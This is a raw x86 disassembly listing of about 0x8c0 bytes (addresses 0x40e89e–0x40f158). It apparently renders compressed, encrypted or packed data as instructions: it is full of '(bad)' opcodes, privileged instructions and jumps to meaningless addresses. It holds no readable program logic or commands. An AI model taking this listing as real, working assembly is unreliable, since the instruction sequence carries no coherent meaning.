  40e89e:	or     cl,al
  40e8a0:	dec    esi
  40e8a1:	push   ebx
  40e8a2:	or     cl,ch
  40e8a4:	lahf   
  40e8a5:	jl     0x40e8f8
  40e8a7:	or     al,0x0
	...
  40e8b9:	add    BYTE PTR [eax],al
  40e8bb:	add    bh,cl
  40e8bd:	xchg   esp,eax
  40e8be:	cmc    
  40e8bf:	adc    al,0x58
  40e8c1:	repnz pop edi
  40e8c3:	and    BYTE PTR [eax-0x5c56fe6c],cl
  40e8c9:	lods   al,BYTE PTR ds:[esi]
  40e8ca:	pusha  
  40e8cb:	or     ch,BYTE PTR [ebx+0x53]
  40e8ce:	or     BYTE PTR [ecx-0x16f7ad4e],dl
  40e8d4:	pop    edi
  40e8d5:	jl     0x40e940
  40e8d7:	add    al,0xcf
  40e8d9:	xchg   esp,eax
  40e8da:	cmc    
  40e8db:	fadd   QWORD PTR [edi-0xe]
  40e8de:	inc    ebx
  40e8df:	mov    al,0x8f
  40e8e1:	xchg   esp,eax
  40e8e2:	add    DWORD PTR [ecx],ebp
  40e8e4:	call   0xb6f9:0x8fe9604f
  40e8eb:	add    BYTE PTR [edx-0x5e],cl
  40e8ee:	add    al,0xe8
  40e8f0:	aam    0xce
  40e8f2:	cmc    
  40e8f3:	call   FWORD PTR [edx+0x248e9de2]
  40e8f9:	xchg   esi,eax
  40e8fa:	cmc    
  40e8fb:	jne    0x40e8d6
  40e8fd:	cmp    eax,0x34aa595b
  40e902:	div    DWORD PTR [ebp-0x67]
  40e905:	xor    al,0x7d
  40e907:	hlt    
  40e908:	mov    ah,BYTE PTR [edx-0x30f117fc]
  40e90e:	cmc    
  40e90f:	jmp    FWORD PTR [edx+0x20fff89f]
  40e915:	cmp    eax,0x3db975f7
  40e91a:	gs pop ecx
  40e91c:	stos   BYTE PTR es:[edi],al
  40e91d:	sub    edi,esi
  40e91f:	jne    0x40e921
	...
  40e931:	add    BYTE PTR [eax],al
  40e933:	add    BYTE PTR [ecx+0x29],dl
  40e936:	jge    0x40e914
  40e938:	pop    edx
  40e939:	stos   DWORD PTR es:[edi],eax
  40e93a:	add    al,0xe8
  40e93c:	stos   BYTE PTR es:[edi],al
  40e93d:	(bad)  
  40e93e:	cmc    
  40e93f:	dec    DWORD PTR [edx-0x55]
  40e942:	shr    al,0xa5
  40e945:	push   esp
  40e946:	cmc    
  40e947:	(bad)  
  40e948:	jp     0x40e914
  40e94a:	mov    edi,0x5b9535c2
  40e94f:	mov    edi,ecx
  40e951:	adc    al,0xca
  40e953:	call   0x55d9d0e
  40e958:	sub    bl,BYTE PTR [ebx+ebx*1]
  40e95b:	add    DWORD PTR ds:0xb1458395,esp
  40e961:	rol    BYTE PTR [ebx-0x7c3ff2bb],0x45
  40e968:	cdq    
  40e969:	shl    BYTE PTR [edx+0x2],0xaa
  40e96d:	stos   DWORD PTR es:[edi],eax
  40e96e:	sbb    al,ch
  40e970:	test   BYTE PTR [ecx],ah
  40e972:	idiv   edi
  40e974:	jbe    0x40e929
  40e976:	lock add DWORD PTR [edx+esi*8-0x4730d80],ecx
  40e97e:	or     edi,edi
  40e980:	jns    0x40e949
  40e982:	test   DWORD PTR [esp+ebx*8-0x1e],eax
  40e986:	in     eax,dx
  40e987:	fs dec ebp
  40e989:	sti    
  40e98a:	xchg   esi,eax
  40e98b:	je     0x40e969
  40e98d:	push   edx
  40e98e:	jne    0x40e9d6
  40e990:	mov    ebx,?
  40e992:	add    al,al
  40e994:	fwait
  40e995:	jo     0x40e94b
  40e997:	inc    DWORD PTR [eax]
	...
  40e9a9:	add    BYTE PTR [eax],al
  40e9ab:	add    bl,al
  40e9ad:	cli    
  40e9ae:	cwde   
  40e9af:	inc    esp
  40e9b0:	ror    BYTE PTR [edx-0x67],0x44
  40e9b4:	mov    ah,0x2a
  40e9b6:	cdq    
  40e9b7:	inc    esp
  40e9b8:	test   al,0x2a
  40e9ba:	and    BYTE PTR [eax],al
  40e9bc:	mov    ds:0xb2e7f987,eax
  40e9c1:	add    BYTE PTR [edi-0x6b8ff002],dl
  40e9c7:	add    BYTE PTR [ebx-0x7c00ae90],bl
  40e9cd:	(bad)  
  40e9ce:	xchg   esi,eax
  40e9cf:	je     0x40e951
  40e9d1:	push   esi
  40e9d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9d3:	arpl   bp,cx
  40e9d5:	std    
  40e9d6:	mov    eax,ds:0x9fdd345
  40e9db:	or     ecx,DWORD PTR [edi+ebp*8-0x80]
  40e9df:	mov    ds:0x8d09fd8c,al
  40e9e4:	leave  
  40e9e5:	sub    DWORD PTR [edx],edi
  40e9e7:	(bad)  
  40e9e8:	shl    DWORD PTR ds:0x21c98d3a,1
  40e9ee:	cmp    ch,BYTE PTR [edx-0x71]
  40e9f1:	push   ss
  40e9f2:	adc    DWORD PTR [eax],edx
  40e9f4:	and    al,0xcd
  40e9f6:	fwait
  40e9f7:	(bad)  
  40e9f8:	sub    edi,DWORD PTR [ebx+0x28]
  40e9fb:	clc    
  40e9fc:	mov    esi,gs
  40e9fe:	add    BYTE PTR [edx-0x74f60274],0xc9
  40ea05:	xchg   esp,eax
  40ea06:	push   ebx
  40ea07:	sahf   
  40ea08:	mov    ebx,0x10afad17
  40ea0d:	push   edx
  40ea0e:	push   ebx
  40ea0f:	xor    eax,DWORD PTR [eax]
	...
  40ea21:	add    BYTE PTR [eax],al
  40ea23:	add    BYTE PTR [ecx],cl
  40ea25:	push   edx
  40ea26:	push   edi
  40ea27:	xor    eax,DWORD PTR [ecx]
  40ea29:	push   edx
  40ea2a:	dec    ebx
  40ea2b:	xor    esi,DWORD PTR [esi-0x70]
  40ea2e:	sbb    BYTE PTR ss:[esp+edi*8+0x68],bh
  40ea33:	xchg   ebp,eax
  40ea34:	fiadd  DWORD PTR [edi]
  40ea36:	arpl   WORD PTR [eax],sp
  40ea38:	aam    0x95
  40ea3a:	xchg   esp,eax
  40ea3b:	rcl    DWORD PTR ds:[ecx-0x6bb3728d],cl
  40ea42:	push   ds
  40ea43:	sahf   
  40ea44:	mov    edx,0xec082f07
  40ea49:	push   ss
  40ea4a:	mov    eax,ds:0xf707ab03
  40ea4f:	popf   
  40ea50:	retf   0x4391
  40ea53:	lea    ecx,[esp+edx*4-0x1a]
  40ea57:	popf   
  40ea58:	xchg   edx,eax
  40ea59:	pop    es
  40ea5a:	out    dx,eax
  40ea5b:	pop    ss
  40ea5c:	cmp    ah,0xe1
  40ea5f:	lahf   
  40ea60:	add    BYTE PTR [edi],0xa7
  40ea63:	inc    edi
  40ea64:	fs xchg ebp,eax
  40ea66:	fild   WORD PTR [ebx]
  40ea68:	mov    WORD PTR [ebx],ss
  40ea6a:	or     eax,0xdf551980
  40ea6f:	pushf  
  40ea70:	fistp  QWORD PTR [ebp+0x15fbdf62]
  40ea76:	and    DWORD PTR [ebx+edx*2],eax
  40ea79:	cmp    BYTE PTR [edi+0x66308880],0x43
  40ea80:	mov    WORD PTR [edi],es
  40ea82:	adc    al,0xf5
  40ea84:	mov    bl,0x75
  40ea86:	pop    ecx
  40ea87:	inc    esp
	...
  40ea9c:	mov    WORD PTR [ecx],ds
  40ea9e:	and    eax,0xfd07dbac
  40eaa3:	scas   eax,DWORD PTR es:[edi]
  40eaa4:	and    al,BYTE PTR [ecx+0x7ff8e508]
  40eaaa:	add    BYTE PTR [ecx+0x66f60c80],al
  40eab0:	xlat   BYTE PTR ds:[ebx]
  40eab1:	aam    0x18
  40eab3:	jmp    0x6b260672
  40eab8:	(bad)  
  40eab9:	cli    
  40eaba:	cmc    
  40eabb:	aam    0x87
  40eabd:	cld    
  40eabe:	ss pushf 
  40eac0:	or     BYTE PTR [esi],al
  40eac2:	arpl   cx,bx
  40eac4:	adc    dl,BYTE PTR [eax-0x8]
  40eac7:	cdq    
  40eac8:	clc    
  40eac9:	jg     0x40eacb
  40eacb:	inc    ecx
  40eacc:	cmp    BYTE PTR [edx-0xb],ah
  40eacf:	es xchg ebp,eax
  40ead1:	aam    0x7b
  40ead3:	in     eax,0xd6
  40ead5:	aam    0x0
  40ead7:	jmp    0x2ea18f41
  40eadc:	fs push ebp
  40eade:	or     BYTE PTR [ebx+edx*2+0x4],dh
  40eae2:	pop    ecx
  40eae3:	adc    DWORD PTR [edx+0x6b],edi
  40eae6:	cmc    
  40eae7:	test   BYTE PTR [esp+edx*8-0x2b391a85],0x0
  40eaef:	jmp    0xe9253c44
  40eaf4:	(bad)  
  40eaf5:	xchg   esp,eax
  40eaf6:	or     BYTE PTR [edx+edx*8-0x8],ah
  40eafa:	pop    eax
  40eafb:	into   
  40eafc:	call   0x0:0xb5e09c
	...
  40eb13:	add    BYTE PTR [edx+0x4ff2f605],ah
  40eb19:	or     BYTE PTR [esi],0x6a
  40eb1c:	jp     0x40eb16
  40eb1e:	or     BYTE PTR [edx+ecx*4],dh
  40eb21:	mov    ecx,0x8e4db0c8
  40eb26:	or     BYTE PTR [ecx],bh
  40eb28:	xor    eax,0xfeece1dd
  40eb2d:	in     eax,dx
  40eb2e:	jns    0x40eb18
  40eb30:	into   
  40eb31:	cdq    
  40eb32:	enter  0x2800,0x21
  40eb36:	pop    esi
  40eb37:	or     DWORD PTR ds:0x5d057b93,0xffffff91
  40eb3e:	or     BYTE PTR [ecx],al
  40eb40:	and    eax,0xe901f115
  40eb45:	(bad)  
  40eb46:	and    eax,eax
  40eb48:	mov    esp,0x6000dd3
  40eb4d:	jle    0x40ead2
  40eb4f:	inc    ecx
  40eb50:	in     eax,0x16
  40eb52:	dec    ebp
  40eb53:	in     al,dx
  40eb54:	add    eax,0x3d087d29
  40eb59:	pop    ebp
  40eb5a:	pop    esp
  40eb5b:	jmp    DWORD PTR [edx+0x1901fe14]
  40eb61:	(bad)  
  40eb65:	sahf   
  40eb66:	push   cs
  40eb67:	and    DWORD PTR [eax],0x36
  40eb6a:	div    BYTE PTR [ebx+ebp*4-0x4]
  40eb6e:	mov    ch,0xc9
  40eb70:	addr16 cdq 
  40eb72:	or     BYTE PTR [ebp-0xb9ca08],cl
	...
  40eb8c:	sbb    BYTE PTR [ecx+0x28f892e0],bl
  40eb92:	test   DWORD PTR [ebx+0x57c939d],0x750828f6
  40eb9c:	imul   ecx,DWORD PTR [esi],0x75
  40eb9f:	in     al,dx
  40eba0:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40eba2:	push   cs
  40eba3:	sub    esp,DWORD PTR ds:0x7508c7d7
  40eba9:	sbb    al,0x4d
  40ebab:	in     al,dx
  40ebac:	test   DWORD PTR [ecx],ebp
  40ebae:	jge    0x40ebb8
  40ebb0:	dec    ebp
  40ebb1:	mov    al,ds:0x9522ff5b
  40ebb6:	enter  0x3b75,0xe
  40ebba:	jne    0x40eba8
  40ebbc:	xor    eax,0x8c2b0ea4
  40ebc1:	cmp    eax,esp
  40ebc3:	rol    DWORD PTR [ebx+edi*8-0x54c7bb80],0x91
  40ebcb:	je     0x40eb61
  40ebcd:	and    edi,DWORD PTR [ecx]
  40ebcf:	push   ebp
  40ebd0:	sbb    edi,DWORD PTR [esi-0x73]
  40ebd3:	test   esp,0x89830800
  40ebd9:	pop    edi
  40ebda:	or     al,0x75
  40ebdc:	mov    ah,BYTE PTR [edx-0xd313734]
  40ebe2:	or     DWORD PTR [ebp-0xc338b7],ecx
  40ebe8:	popa   
  40ebe9:	add    esp,DWORD PTR [edx-0x6e39c6ca]
  40ebef:	add    BYTE PTR [eax],0x0
	...
  40ec02:	add    BYTE PTR [eax],al
  40ec04:	aam    0x9a
  40ec06:	pop    ss
  40ec07:	push   es
  40ec08:	(bad)  
  40ec0b:	inc    DWORD PTR [eax-0xb]
  40ec0e:	out    0xbf,al
  40ec10:	aad    0xb8
  40ec12:	add    al,0x0
  40ec14:	or     DWORD PTR [eax],edi
  40ec16:	scas   al,BYTE PTR es:[edi]
  40ec17:	dec    edi
  40ec18:	mov    bl,0x1f
  40ec1a:	add    ch,al
  40ec1c:	xchg   BYTE PTR [eax],ch
  40ec1e:	xchg   ebx,eax
  40ec1f:	dec    BYTE PTR [edi]
  40ec21:	xchg   ebx,eax
  40ec22:	in     al,dx
  40ec23:	je     0x40ebb7
  40ec25:	jp     0x40ec36
  40ec27:	in     al,dx
  40ec28:	mov    WORD PTR [eax+0x454c2b07],es
  40ec2e:	int3   
  40ec2f:	pop    es
  40ec30:	mov    WORD PTR [eax+0x48],?
  40ec33:	in     al,dx
  40ec34:	fcom   QWORD PTR [edi-0x14]
  40ec37:	(bad)  
  40ec38:	stc    
  40ec39:	cmc    
  40ec3a:	mov    eax,ds:0x92dac125
  40ec3f:	mov    ecx,cs
  40ec41:	sar    DWORD PTR [ecx],1
  40ec43:	jmp    ecx
  40ec45:	cmc    
  40ec46:	mov    eax,ds:0x9332b895
  40ec4b:	add    BYTE PTR [ebp+edx*4-0x20],0x15
  40ec50:	xchg   edi,eax
  40ec51:	pop    ss
  40ec52:	test   al,0x6
  40ec54:	ret    
  40ec55:	call   0x21c:0x95201862
  40ec5c:	ja     0x40ec32
  40ec5e:	mov    eax,0x42948bc5
  40ec63:	jnp    0x40ec6e
  40ec65:	push   esi
  40ec66:	fisttp WORD PTR [eax+0x0]
	...
  40ec7c:	enter  0xff0,0x2e
  40ec80:	mov    ah,0x3
  40ec82:	aad    0xb
  40ec84:	hlt    
  40ec85:	add    eax,0x6cfa9abc
  40ec8a:	adc    eax,0x5494b358
  40ec8f:	inc    eax
  40ec90:	clc    
  40ec91:	fld    DWORD PTR fs:[ebx+eiz*8]
  40ec95:	mov    ebx,esp
  40ec97:	call   0x3da:0x27478c60
  40ec9e:	daa    
  40ec9f:	int3   
  40eca0:	int    0x8c
  40eca2:	fbstp  TBYTE PTR [eax]
  40eca4:	pop    ss
  40eca5:	icebp  
  40eca6:	bound  edi,QWORD PTR [edi-0x685aee49]
  40ecac:	inc    ebx
  40ecad:	in     al,dx
  40ecae:	pop    ss
  40ecaf:	xor    ebp,DWORD PTR [ebx-0x5feff0fd]
  40ecb5:	add    edi,DWORD PTR [ebp+0x7]
  40ecb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ecb9:	lock xchg ecx,eax
  40ecbb:	call   0x39b:0xf1f8f92
  40ecc2:	push   ebp
  40ecc3:	or     al,0x83
  40ecc5:	mov    ebx,edx
  40ecc7:	lods   al,BYTE PTR ds:[esi]
  40ecc8:	mov    dh,0x2
  40ecca:	fistp  WORD PTR [ecx+0x45cd486]
  40ecd0:	imul   ecx,DWORD PTR [ecx+0x645caccb],0xffffffb6
  40ecd7:	cdq    
  40ecd8:	inc    esp
  40ecd9:	(bad)  
  40ecda:	or     ch,ah
  40ecdc:	(bad)
	...
  40ecf4:	and    eax,0xe1910488
  40ecf9:	pusha  
  40ecfa:	cmc    
  40ecfb:	sahf   
  40ecfc:	mov    esp,edx
  40ecfe:	jl     0x40ecca
  40ed00:	adc    al,0x88
  40ed02:	sbb    BYTE PTR [ecx],bh
  40ed04:	clc    
  40ed05:	dec    ebx
  40ed06:	push   ebx
  40ed07:	xchg   BYTE PTR ds:0xb6806053,al
  40ed0d:	ret    
  40ed0e:	or     BYTE PTR [esi-0x7d],dh
  40ed11:	pushf  
  40ed12:	cmc    
  40ed13:	hlt    
  40ed14:	sti    
  40ed15:	push   edx
  40ed16:	cmc    
  40ed17:	fcom   QWORD PTR [edi+0x156980ec]
  40ed1d:	add    ah,cl
  40ed1f:	adc    eax,0x20f603b7
  40ed24:	shl    BYTE PTR [esi-0x10ef63f8],cl
  40ed2a:	pusha  
  40ed2b:	jmp    0xc1f7e0bf
  40ed30:	shl    BYTE PTR [esi+0x47],0xe9
  40ed34:	and    al,0x88
  40ed36:	add    al,0x93
  40ed38:	rol    DWORD PTR [ecx],0x7c
  40ed3b:	icebp  
  40ed3c:	out    0x32,eax
  40ed3e:	not    BYTE PTR [esi]
  40ed40:	adc    eax,0xf4e9087b
  40ed45:	inc    eax
  40ed46:	popa   
  40ed47:	sbb    eax,0xfe08556c
  40ed4c:	mov    dl,BYTE PTR [eax-0x780b2c9e]
  40ed52:	add    BYTE PTR [ecx],al
  40ed54:	pop    es
  40ed55:	add    esi,esi
  40ed57:	out    0x0,al
	...
  40ed69:	add    BYTE PTR [eax],al
  40ed6b:	add    BYTE PTR [edi-0x2a31f76c],dh
  40ed71:	jns    0x40ed34
  40ed73:	dec    ebp
  40ed74:	iret   
  40ed75:	xchg   esp,eax
  40ed76:	cmc    
  40ed77:	push   esp
  40ed78:	xchg   esp,eax
  40ed79:	outs   dx,BYTE PTR ds:[esi]
  40ed7a:	adc    al,0x0
  40ed7c:	dec    edx
  40ed7d:	xchg   ebx,eax
  40ed7e:	add    al,ch
  40ed80:	out    0x1c,eax
  40ed82:	idiv   edi
  40ed84:	int    0x98
  40ed86:	or     bh,ch
  40ed88:	mov    ebx,0x7464dcad
  40ed8d:	cwde   
  40ed8e:	cmc    
  40ed8f:	jne    0x40edba
  40ed91:	mov    al,0x14
  40ed93:	call   DWORD PTR [eax+0x1a6be090]
  40ed99:	sbb    eax,0x963568f7
  40ed9e:	in     eax,0xbe
  40eda0:	jge    0x40ed71
  40eda2:	imul   eax,DWORD PTR [ecx+0x25],0x8f0c7d1d
  40eda9:	div    esi
  40edab:	jne    0x40edaa
  40edad:	sub    eax,0x1c5aff5a
  40edb2:	outs   dx,BYTE PTR ds:[esi]
  40edb3:	add    ch,ah
  40edb5:	sub    al,0xb4
  40edb7:	push   0x47a1a1
  40edbc:	dec    edx
  40edbd:	xchg   edx,eax
  40edbe:	add    al,0x6a
  40edc0:	xchg   BYTE PTR [ebx],bl
  40edc2:	jge    0x40edcc
  40edc4:	dec    ebp
  40edc5:	jmp    0x8c7:0xce7afff6
  40edcc:	mov    ch,0xb2
  40edce:	sub    esp,0x0
	...
  40ede4:	es inc ecx
  40ede6:	repnz push 0xffffffa5
  40ede9:	scas   eax,DWORD PTR es:[edi]
  40edea:	cmp    bh,bh
  40edec:	add    BYTE PTR [esi+0x1d00cde0],cl
  40edf2:	test   DWORD PTR [ecx+0x6c6e29f0],0xff085700
  40edfc:	add    BYTE PTR [esi+0x296a4de0],cl
  40ee02:	idiv   edi
  40ee04:	loopne 0x40ee22
  40ee06:	div    DWORD PTR [ebp-0x74]
  40ee09:	repz mov eax,ds:0x9dd2c1f7
  40ee0f:	enter  0xef4e,0x9
  40ee13:	push   ebp
  40ee14:	pop    es
  40ee15:	iret   
  40ee16:	mov    ebx,eax
  40ee18:	push   eax
  40ee19:	push   ebp
  40ee1a:	or     al,0x6a
  40ee1c:	jg     0x40ee50
  40ee1e:	sbb    BYTE PTR [eax],cl
  40ee20:	xor    al,0x17
  40ee22:	cmp    bh,bh
  40ee24:	cmp    eax,DWORD PTR [edi+eax*2+0x27a6a4fc]
  40ee2b:	inc    ecx
  40ee2c:	mov    WORD PTR [edx],ss
  40ee2e:	sbb    BYTE PTR [eax],cl
  40ee30:	xor    al,0xf7
  40ee32:	sahf   
  40ee33:	(bad)  
  40ee34:	sbb    eax,DWORD PTR [edx+0x13fc17]
  40ee3a:	add    ch,al
  40ee3c:	shl    DWORD PTR [edi-0x532a0163],cl
  40ee42:	or     BYTE PTR [eax],al
  40ee44:	popa   
  40ee45:	xchg   BYTE PTR [eax+0x82],ah
	...
  40ee5b:	add    al,cl
  40ee5d:	bound  esp,QWORD PTR [edx]
  40ee5f:	add    BYTE PTR [esi-0x59],dh
  40ee62:	popf   
  40ee63:	je     0x40edf9
  40ee65:	arpl   WORD PTR [ecx],sp
  40ee67:	push   ebp
  40ee68:	fcmovnb st,st(1)
  40ee6a:	add    DWORD PTR [eax+edx*8-0x2e],0xffffff88
  40ee6f:	fs dec ebp
  40ee71:	jmp    0x40ee11
  40ee73:	je     0x40ee09
  40ee75:	mov    ds:0xa1bbfda1,eax
  40ee7a:	and    al,BYTE PTR [eax]
  40ee7c:	and    al,0x50
  40ee7e:	daa    
  40ee7f:	inc    ecx
  40ee80:	mov    WORD PTR [ebx],ss
  40ee82:	jge    0x40eee8
  40ee84:	dec    ebp
  40ee85:	jmp    0x40ee25
  40ee87:	xor    al,0xbf
  40ee89:	inc    edx
  40ee8a:	dec    ebp
  40ee8b:	add    BYTE PTR [esi+ecx*8-0xc7400ce],ah
  40ee92:	leave  
  40ee93:	jae    0x40ee58
  40ee95:	xchg   esp,eax
  40ee96:	js     0x40eed8
  40ee98:	je     0x40ef07
  40ee9a:	call   0x47d5a1f4
  40ee9f:	add    al,0x8c
  40eea1:	out    dx,eax
  40eea2:	test   DWORD PTR [ebx],ebp
  40eea4:	push   edi
  40eea5:	jns    0x40eec7
  40eea7:	add    al,0x5b
  40eea9:	mov    al,bh
  40eeab:	xchg   esi,eax
  40eeac:	fmul   DWORD PTR [edi+eax*8-0x5900352f]
  40eeb3:	sub    eax,DWORD PTR [ebp+0x3f]
  40eeb6:	and    BYTE PTR [esp+eiz*4],al
  40eeb9:	xchg   esp,eax
  40eeba:	fbld   TBYTE PTR [esi+0x1fb36cf1]
	...
  40eed4:	int    0x94
  40eed6:	xchg   BYTE PTR [eax],dl
  40eed8:	and    al,0x0
  40eeda:	cmc    
  40eedb:	or     esp,DWORD PTR [ebx*4+0x1296f6]
  40eee2:	cmc    
  40eee3:	fwait
  40eee4:	repz int 0x1e
  40eee7:	xchg   edi,eax
  40eee8:	add    al,BYTE PTR [eax]
  40eeea:	aad    0x97
  40eeec:	cli    
  40eeed:	mov    edi,esi
  40eeef:	stos   DWORD PTR es:[edi],eax
  40eef0:	mov    bh,0x69
  40eef2:	pop    esi
  40eef3:	xchg   esi,eax
  40eef4:	aam    0xd2
  40eef6:	jmp    0x40eefb
  40eef8:	cmp    DWORD PTR [ebx],ecx
  40eefa:	pop    esp
  40eefb:	or     bh,0x0
  40eefe:	fiadd  DWORD PTR [ebx]
  40ef00:	leavew 
  40ef02:	adc    BYTE PTR ds:[esp+ebp*8-0x3cd0c1],dl
  40ef0a:	js     0x40ef4c
  40ef0c:	mov    eax,0x4d20506c
  40ef11:	xchg   esp,eax
  40ef12:	push   ds
  40ef13:	adc    BYTE PTR [esp+ebp*8-0x5d6a81],dl
  40ef1a:	push   cs
  40ef1b:	adc    BYTE PTR [eax-0x5bf48301],bl
  40ef21:	mov    ecx,DWORD PTR [eax]
  40ef23:	pushf  
  40ef24:	and    bh,dh
  40ef26:	mov    edi,0x5cff832b
  40ef2b:	jb     0x40ef51
  40ef2d:	adc    cl,ch
  40ef2f:	frstor [esi+0x11f6294]
  40ef35:	mov    BYTE PTR [eax],al
  40ef37:	rol    DWORD PTR [eax],0x0
	...
  40ef4a:	add    BYTE PTR [eax],al
  40ef4c:	jmp    0x807e4b4
  40ef51:	pop    eax
  40ef52:	hlt    
  40ef53:	push   ecx
  40ef54:	mov    dh,0x78
  40ef56:	inc    edi
  40ef57:	jmp    0xc141777c
  40ef5c:	sub    DWORD PTR [ecx],eax
  40ef5e:	mul    BYTE PTR [esi-0x610b77df]
  40ef64:	or     DWORD PTR [eax+eiz*8-0xa00a34d],0xffffffa0
  40ef6c:	dec    esi
  40ef6d:	xchg   ebx,eax
  40ef6e:	or     BYTE PTR [eax*1-0xb5a7615],bl
  40ef75:	ins    BYTE PTR es:[edi],dx
  40ef76:	or     BYTE PTR [ebx],al
  40ef78:	fscale 
  40ef7a:	jnp    0x40ef5d
  40ef7c:	aaa    
  40ef7d:	sbb    DWORD PTR [esi+eiz*2+0x21],0xa05d4c0c
  40ef85:	fsubr  DWORD PTR [ebx-0x58]
  40ef88:	(bad)  
  40ef89:	(bad)  
  40ef8a:	jnp    0x40ef6d
  40ef8c:	aaa    
  40ef8d:	add    esp,esi
  40ef8f:	inc    esi
  40ef90:	add    esi,edi
  40ef92:	jnp    0x40efd1
  40ef94:	stc    
  40ef95:	xchg   DWORD PTR [eax],eax
  40ef97:	inc    ecx
  40ef98:	aaa    
  40ef99:	arpl   bp,si
  40ef9b:	xlat   BYTE PTR cs:[ebx]
  40ef9d:	aam    0xc
  40ef9f:	jmp    0x6b25fb0e
  40efa4:	int3   
  40efa5:	cli    
  40efa6:	(bad)  
  40efa7:	jmp    0x9536ac21
  40efac:	xchg   edi,eax
  40efad:	in     al,dx
  40efae:	inc    ebx
	...
  40efc3:	add    cl,bh
  40efc5:	daa    
  40efc6:	test   DWORD PTR [ecx-0x3391d918],0xff085318
  40efd0:	clc    
  40efd1:	mov    eax,esp
  40efd3:	int    0x70
  40efd5:	sub    edi,esi
  40efd7:	(bad)  
  40efd8:	fcomp  DWORD PTR [edi+esi*8]
  40efdb:	jne    0x40f04a
  40efdd:	sub    bh,BYTE PTR [esi+0x54]
  40efe0:	push   edx
  40efe1:	sub    ecx,eax
  40efe3:	ret    0x9269
  40efe6:	pop    ebx
  40efe7:	mov    eax,DWORD PTR [ecx+0x29]
  40efea:	jge    0x40eff8
  40efec:	dec    ebp
  40efed:	push   ebp
  40efee:	push   ecx
  40efef:	push   edx
  40eff1:	mov    eax,cs
  40eff3:	je     0x40ef85
  40eff5:	mov    al,0xd5
  40eff7:	gs fs cwde 
  40effa:	pop    eax
  40effb:	call   0x36abf2
  40f000:	gs daa 
  40f002:	jge    0x40f014
  40f004:	jne    0x40f02d
  40f006:	jge    0x40f010
  40f008:	std    
  40f009:	jmp    0x40efe9
  40f00b:	inc    DWORD PTR [edx+0x7256c029]
  40f011:	sub    cl,al
  40f013:	ret    0x9201
  40f016:	pop    ebx
  40f017:	mov    eax,DWORD PTR [ecx+0x14]
  40f01a:	retf   0x2af8
  40f01d:	lods   al,BYTE PTR ds:[esi]
  40f01e:	or     BYTE PTR [edx+0x7c],ch
  40f021:	daa    
  40f022:	jge    0x40f02c
  40f024:	cmp    eax,0xff5b2c
	...
  40f039:	add    BYTE PTR [eax],al
  40f03b:	add    BYTE PTR [edx+0x2efc4d0a],dl
  40f041:	out    0x5e,al
  40f043:	dec    eax
  40f044:	hlt    
  40f045:	xchg   ecx,eax
  40f046:	mov    BYTE PTR [edi],bh
  40f048:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f049:	lea    esi,[eax+ebp*2+0x7b]
  40f04d:	sahf   
  40f04e:	inc    edi
  40f04f:	add    BYTE PTR [esi+edi*1-0x14b0f25e],cl
  40f056:	or     DWORD PTR [ebx],ecx
  40f058:	int3   
  40f059:	jg     0x40f097
  40f05b:	push   edi
  40f05c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f05d:	or     DWORD PTR [edx],ebp
  40f05f:	dec    DWORD PTR [ebx-0x268c360e]
  40f065:	je     0x40f09d
  40f067:	clc    
  40f068:	jnp    0x40f0ca
  40f06a:	test   BYTE PTR [ecx-0x6a],ch
  40f06d:	fimul  WORD PTR [edi]
  40f06f:	or     BYTE PTR [ebp+ebp*2-0x67],dh
  40f073:	(bad)  
  40f074:	arpl   si,cx
  40f076:	psubb  mm4,mm6
  40f079:	neg    DWORD PTR [edx+0x3e38474]
  40f07f:	dec    DWORD PTR [ebx+0x46]
  40f082:	call   0xc1fe:0xed514474
  40f089:	add    edx,DWORD PTR [edx-0x65e1cc95]
  40f08f:	addr16 xor eax,0x23004b90
  40f095:	test   al,0x84
  40f097:	out    0x20,eax
  40f099:	mov    ah,0x99
  40f09b:	inc    BYTE PTR [edi+0x12112b]
	...
  40f0b1:	add    BYTE PTR [eax],al
  40f0b3:	add    BYTE PTR [esi+eax*4+0xf],bl
  40f0b7:	clc    
  40f0b8:	pop    esp
  40f0b9:	outs   dx,BYTE PTR ds:[esi]
  40f0ba:	invd   
  40f0bc:	in     al,0x15
  40f0be:	mov    bl,0xfe
  40f0c0:	repz (bad) 
  40f0c2:	fst    DWORD PTR [ebp-0x15]
  40f0c5:	gs cdq 
  40f0c7:	je     0x40f0ad
  40f0c9:	push   edx
  40f0ca:	rcl    DWORD PTR [ebp-0x25],1
  40f0cd:	push   ebp
  40f0ce:	cwde   
  40f0cf:	xor    cl,ah
  40f0d1:	adc    ebx,DWORD PTR [edx-0x613a3402]
  40f0d7:	lods   eax,DWORD PTR ds:[esi]
  40f0d8:	test   dh,dh
  40f0da:	adc    BYTE PTR [ebx+edi*4-0x4d706b6d],al
  40f0e1:	xchg   bh,dh
  40f0e3:	fwait
  40f0e4:	pop    es
  40f0e5:	popa   
  40f0e6:	push   ds
  40f0e7:	xchg   ebx,eax
  40f0e8:	inc    edx
  40f0e9:	retf   
  40f0ea:	and    DWORD PTR [eax],ecx
  40f0ec:	mov    WORD PTR [edi+0x7a],fs
  40f0ef:	mov    al,ds:0x9be38692
  40f0f4:	icebp  
  40f0f5:	pop    esi
  40f0f6:	(bad)  
  40f0f7:	xchg   edx,eax
  40f0f8:	xchg   esi,eax
  40f0f9:	aam    0x7b
  40f0fb:	lock repz cld 
  40f0fe:	inc    esp
  40f0ff:	inc    ebp
  40f100:	mov    WORD PTR [edi+edx*8-0x6b],fs
  40f104:	(bad)  
  40f105:	sti    
  40f106:	fidiv  WORD PTR [ebx]
  40f108:	arpl   WORD PTR [edx-0x7da4cc11],ax
  40f10e:	neg    DWORD PTR [ebx-0x6d491d40]
  40f114:	xor    ebp,edx
  40f116:	adc    al,0x93
	...
  40f12c:	inc    edx
  40f12d:	into   
  40f12e:	mov    eax,ds:0x7a613bff
  40f133:	lahf   
  40f134:	push   cs
  40f135:	shl    DWORD PTR [edi+0x994b63a],1
  40f13b:	into   
  40f13c:	and    al,BYTE PTR [edx+0x67899be7]
  40f142:	mov    ss,WORD PTR [edx+0x7e735204]
  40f148:	enter  0x2763,0x45
  40f14c:	mov    WORD PTR [edi+eiz*4],ss
  40f14f:	add    eax,DWORD PTR [eax+0x6896d75d]
  40f155:	push   ebp
  40f156:	fistp  QWORD PTR [edx]
  40f158:	hlt    
